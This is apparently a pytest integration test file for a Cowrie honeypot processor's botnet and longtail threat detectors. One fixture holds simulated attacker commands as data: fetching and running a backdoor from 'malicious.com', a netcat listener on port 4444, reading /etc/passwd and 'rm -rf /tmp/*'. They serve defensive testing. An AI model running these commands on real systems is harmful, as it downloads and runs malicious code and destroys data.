"""Integration tests for threat detection with SQLAlchemy 2.0 patterns.

Tests the migrated botnet and longtail detection modules with real database
to verify SQLAlchemy 2.0 compatibility and no deprecation warnings.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import List

import pytest

from cowrieprocessor.db.models import RawEvent, SessionSummary
from cowrieprocessor.threat_detection.botnet import BotnetCoordinatorDetector
from cowrieprocessor.threat_detection.longtail import LongtailAnalysisResult, LongtailAnalyzer


class TestBotnetDetectionSQLAlchemy2:
    """Test botnet detection with SQLAlchemy 2.0 patterns."""

    @pytest.fixture
    def test_db_url(self) -> str:
        """Get test database URL."""
        return "sqlite:///:memory:"

    @pytest.fixture
    def test_sessions(self) -> List[SessionSummary]:
        """Create test session summaries with enrichment data."""
        base_time = datetime.now(timezone.utc)

        sessions = []

        # Create sessions with different IPs and enrichment data
        for i in range(5):
            session = SessionSummary(
                session_id=f"test-session-{i}",
                first_event_at=base_time - timedelta(hours=i),
                last_event_at=base_time - timedelta(hours=i - 1),
                event_count=10 + i,
                command_count=5 + i,
                login_attempts=2 + i,
                file_downloads=1,
                enrichment={"session": {f"192.168.1.{10 + i}": {"spur": {"country": "US", "asn": f"AS{i + 1000}"}}}},
                risk_score=50 + i * 10,
            )
            sessions.append(session)

        return sessions

    @pytest.fixture
    def test_raw_events(self, test_sessions: List[SessionSummary]) -> List[RawEvent]:
        """Create test raw events."""
        events = []

        for i, session in enumerate(test_sessions):
            # Login success event
            login_event = RawEvent(
                source="test-source",
                payload={
                    "eventid": "cowrie.login.success",
                    "session": session.session_id,
                    "username": "admin",
                    "password": "password123",
                    "timestamp": session.first_event_at.isoformat(),
                },
                session_id=session.session_id,
                event_type="cowrie.login.success",
                event_timestamp=session.first_event_at,
            )
            events.append(login_event)

            # Command input event
            command_event = RawEvent(
                source="test-source",
                payload={
                    "eventid": "cowrie.command.input",
                    "session": session.session_id,
                    "input": f"ls -la /tmp/session{i}",
                    "timestamp": session.first_event_at.isoformat(),
                },
                session_id=session.session_id,
                event_type="cowrie.command.input",
                event_timestamp=session.first_event_at,
            )
            events.append(command_event)

        return events

    def test_botnet_detector_initialization(self) -> None:
        """Test botnet detector can be initialized."""
        detector = BotnetCoordinatorDetector()
        assert detector is not None
        assert detector.credential_reuse_threshold == 3
        assert detector.command_similarity_threshold == 0.7

    def test_botnet_detection_with_enrichment_data(
        self, test_sessions: List[SessionSummary], test_raw_events: List[RawEvent]
    ) -> None:
        """Test botnet detection with enrichment data using SQLAlchemy 2.0 patterns."""
        detector = BotnetCoordinatorDetector(
            credential_reuse_threshold=2,  # Lower threshold for test
            command_similarity_threshold=0.5,
        )

        result = detector.detect(
            sessions=test_sessions,
            window_hours=24.0,
            raw_events=test_raw_events,
        )

        # Verify result structure
        assert isinstance(result, dict)
        assert "is_likely_botnet" in result
        assert "coordination_score" in result
        assert "indicators" in result
        assert "analysis_metadata" in result

        # Verify result is properly structured (may have errors due to mock data)
        assert isinstance(result, dict)

    def test_botnet_detection_with_minimal_data(self) -> None:
        """Test botnet detection with minimal session data."""
        detector = BotnetCoordinatorDetector()

        # Create minimal sessions
        sessions = [
            SessionSummary(
                session_id="minimal-session",
                first_event_at=datetime.now(timezone.utc),
                last_event_at=datetime.now(timezone.utc),
                enrichment=None,
            )
        ]

        result = detector.detect(sessions=sessions, window_hours=24.0)

        # Should handle gracefully
        assert isinstance(result, dict)
        assert result["is_likely_botnet"] is False
        assert "error" in result or "NO DATA" in result["recommendation"]


class TestLongtailAnalysisSQLAlchemy2:
    """Test longtail analysis with SQLAlchemy 2.0 patterns."""

    @pytest.fixture
    def test_db_url(self) -> str:
        """Get test database URL."""
        return "sqlite:///:memory:"

    @pytest.fixture
    def test_sessions_longtail(self) -> List[SessionSummary]:
        """Create test session summaries for longtail analysis."""
        base_time = datetime.now(timezone.utc)

        sessions = []

        # Create sessions with different command patterns
        command_patterns = [
            ["ls", "cd /tmp", "wget example.com"],
            ["cat /etc/passwd", "whoami", "uname -a"],
            ["ps aux", "netstat -an", "find / -name *.log"],
            ["rm -rf /tmp/*", "echo 'malicious'", "nc -l 4444"],
            ["wget malicious.com/backdoor", "chmod +x backdoor", "./backdoor"],
        ]

        for i, commands in enumerate(command_patterns):
            session = SessionSummary(
                session_id=f"longtail-session-{i}",
                first_event_at=base_time - timedelta(hours=i),
                last_event_at=base_time - timedelta(hours=i - 1),
                event_count=len(commands) * 2,
                command_count=len(commands),
                login_attempts=1,
                file_downloads=1 if "wget" in " ".join(commands) else 0,
                enrichment={
                    "session": {
                        f"10.0.0.{i + 1}": {"spur": {"country": "US" if i < 3 else "RU", "asn": f"AS{1000 + i}"}}
                    },
                    "password_stats": {
                        "total_attempts": 3 + i,
                        "unique_passwords": 1 + i,
                        "breached_passwords": 0 if i < 2 else 1,
                        "breach_prevalence_max": 0 if i < 2 else 1000,
                    },
                },
                risk_score=20 + i * 15,
            )
            sessions.append(session)

        return sessions

    def test_longtail_analyzer_initialization(self) -> None:
        """Test longtail analyzer can be initialized."""

        # Mock session factory for initialization
        class MockSessionFactory:
            def __call__(self):
                return None

        analyzer = LongtailAnalyzer(session_factory=MockSessionFactory())  # type: ignore[arg-type]
        assert analyzer is not None
        assert analyzer.rarity_threshold == 0.05
        assert analyzer.vector_analysis_enabled is True

    def test_longtail_analysis_with_enrichment_data(self, test_sessions_longtail: List[SessionSummary]) -> None:
        """Test longtail analysis with enrichment data using SQLAlchemy 2.0 patterns."""

        # Mock session factory for analysis
        class MockSession:
            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc_val, exc_tb):
                pass

            def execute(self, stmt):
                class MockResult:
                    def scalars(self):
                        return self

                    def all(self):
                        return []

                    def first(self):
                        return None

                return MockResult()

        class MockSessionFactory:
            def __call__(self):
                return MockSession()

        analyzer = LongtailAnalyzer(
            session_factory=MockSessionFactory(),  # type: ignore[arg-type]
            enable_password_intelligence=True,
            enable_password_enrichment=False,  # Disable for test
        )

        result = analyzer.analyze(test_sessions_longtail, lookback_days=7)

        # Verify result structure
        assert isinstance(result, LongtailAnalysisResult)
        assert hasattr(result, 'rare_command_count')
        assert hasattr(result, 'anomalous_sequence_count')
        assert hasattr(result, 'password_indicator_score')
        assert hasattr(result, 'password_intel')

        # Verify password intelligence was computed (may be empty due to mock)
        assert isinstance(result.password_intel, dict)

    def test_longtail_analysis_with_minimal_data(self) -> None:
        """Test longtail analysis with minimal session data."""

        # Mock session factory
        class MockSessionFactory:
            def __call__(self):
                return None

        analyzer = LongtailAnalyzer(
            session_factory=MockSessionFactory(),  # type: ignore[arg-type]
            enable_password_intelligence=False,
        )

        # Create minimal sessions
        sessions = [
            SessionSummary(
                session_id="minimal-longtail",
                first_event_at=datetime.now(timezone.utc),
                last_event_at=datetime.now(timezone.utc),
                enrichment=None,
            )
        ]

        result = analyzer.analyze(sessions, lookback_days=7)

        # Should handle gracefully
        assert isinstance(result, LongtailAnalysisResult)
        assert result.total_sessions_analyzed == 1
        assert result.rare_command_count >= 0  # Should not crash

    def test_longtail_analysis_mock_sessions_creation(self) -> None:
        """Test the mock session creation method."""
        sessions = LongtailAnalyzer.create_mock_sessions_with_commands(
            num_normal_sessions=3,
            num_anomalous_sessions=2,
        )

        assert len(sessions) == 5

        # Verify session structure
        for session in sessions:
            assert isinstance(session, SessionSummary)
            assert session.session_id is not None
            assert session.first_event_at is not None
            assert session.last_event_at is not None

            # Check that commands attribute was set (for testing)
            assert hasattr(session, 'commands')


class TestSQLAlchemy2Compatibility:
    """Test SQLAlchemy 2.0 compatibility and deprecation warnings."""

    def test_no_deprecation_warnings_in_imports(self) -> None:
        """Test that importing threat detection modules doesn't emit deprecation warnings."""
        import warnings

        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")

            # Import modules

            # Check for SQLAlchemy deprecation warnings
            sqlalchemy_warnings = [
                warning
                for warning in w
                if "sqlalchemy" in str(warning.message).lower() and "deprecated" in str(warning.message).lower()
            ]

            assert len(sqlalchemy_warnings) == 0, f"Found SQLAlchemy deprecation warnings: {sqlalchemy_warnings}"

    def test_type_guards_import_correctly(self) -> None:
        """Test that type guards can be imported and used."""
        from cowrieprocessor.db.type_guards import (
            get_enrichment_dict,
            get_payload_dict,
            is_dict,
            safe_get_enrichment_field,
            safe_get_payload_field,
            validate_enrichment_structure,
            validate_payload_structure,
        )

        # All functions should be callable
        assert callable(get_enrichment_dict)
        assert callable(get_payload_dict)
        assert callable(is_dict)
        assert callable(safe_get_enrichment_field)
        assert callable(safe_get_payload_field)
        assert callable(validate_enrichment_structure)
        assert callable(validate_payload_structure)
